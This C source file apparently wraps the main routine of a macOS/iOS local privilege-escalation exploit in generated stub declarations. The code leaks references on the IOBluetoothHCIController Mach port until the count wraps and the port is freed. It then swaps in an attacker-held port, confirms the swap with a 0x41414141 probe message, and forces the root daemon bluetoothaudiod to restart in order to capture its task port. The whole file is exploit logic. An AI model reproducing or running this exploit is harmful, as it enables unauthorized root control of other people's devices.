#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_5__   TYPE_2__ ;
typedef  struct TYPE_4__   TYPE_1__ ;

/* Type definitions */
typedef  scalar_t__ uint32_t ;
typedef  int /*<<< orphan*/  reply ;
typedef  int /*<<< orphan*/  msg ;
typedef  int mach_port_t ;
typedef  int /*<<< orphan*/  mach_msg_size_t ;
struct TYPE_4__ {int msgh_remote_port; int msgh_id; int msgh_size; int /*<<< orphan*/  msgh_bits; int /*<<< orphan*/  member_0; } ;
typedef  TYPE_1__ mach_msg_header_t ;
struct TYPE_5__ {TYPE_1__ header; int /*<<< orphan*/  member_0; } ;
typedef  TYPE_2__ mach_msg_empty_rcv_t ;
typedef  int /*<<< orphan*/  kern_return_t ;

/* Variables and functions */
 int IOServiceGetMatchingService (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  IOServiceMatching (char*) ; 
 int /*<<< orphan*/  MACH_MSGH_BITS (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int MACH_MSG_OPTION_NONE ; 
 int MACH_MSG_TIMEOUT_NONE ; 
 int /*<<< orphan*/  MACH_MSG_TYPE_COPY_SEND ; 
 int MACH_PORT_NULL ; 
 int MACH_RCV_MSG ; 
 int MACH_RCV_TIMEOUT ; 
 int MACH_SEND_MSG ; 
 int /*<<< orphan*/  force_bluetoothaudiod_restart () ; 
 int getpid () ; 
 int /*<<< orphan*/  inc_and_dec_ref (int) ; 
 int /*<<< orphan*/  kIOMasterPortDefault ; 
 int /*<<< orphan*/  leak_n_refs (int,scalar_t__) ; 
 int /*<<< orphan*/  leak_one_ref (int) ; 
 char* mach_error_string (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  mach_msg (TYPE_1__*,int,int /*<<< orphan*/ ,int,int,int,int) ; 
 int /*<<< orphan*/  mach_task_self () ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int replace_with_receive () ; 
 int /*<<< orphan*/  self ; 
 int /*<<< orphan*/  service_requests (int) ; 

int main() {
	self = mach_task_self(); // avoid making the trap every time

	//mach_port_t test;
  //mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, &test);

  // get the service we want to target:
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
  printf("%d : 0x%x\n", getpid(), service);

  // we don't know how many refs the port actually has - lets guess less than 40...
  uint32_t max_refs = 40;
  leak_n_refs(service, 0x100000000-max_refs);

  // the port now has a reference count just below 0 so we'll try in a loop
  // to free it, reallocate and test to see if it worked - if not we'll hope
  // that was because we didn't free it:

  mach_port_t fake_service_port = MACH_PORT_NULL;
  for (uint32_t i = 0; i < max_refs; i++) {
    inc_and_dec_ref(service);

    mach_port_t replacer_ps = replace_with_receive();

    // send a message to the service - if we receive it on the portset then we won:
    mach_msg_header_t msg = {0};
    msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg.msgh_remote_port = service;
    msg.msgh_id = 0x41414141;
    msg.msgh_size = sizeof(msg);
    kern_return_t err;
    err = mach_msg(&msg,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   (mach_msg_size_t)sizeof(msg),
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    printf("sending probe: %s\n", mach_error_string(err));

    mach_msg_empty_rcv_t reply = {0};
    mach_msg(&reply.header,
             MACH_RCV_MSG | MACH_RCV_TIMEOUT,
             0,
             sizeof(reply),
             replacer_ps,
             1, // 1ms
             0);
             
		if (reply.header.msgh_id == 0x41414141) {
      // worked:
      printf("got the probe message\n");
      fake_service_port = replacer_ps;
      break;
    }
    printf("trying again (%d)\n", i);

    // if it didn't work leak another ref and try again:
    leak_one_ref(service);
  }


  printf("worked? - forcing a root process to restart, hopefully will send us its task port!\n");

	force_bluetoothaudiod_restart();

  service_requests(fake_service_port);

  return 0;
}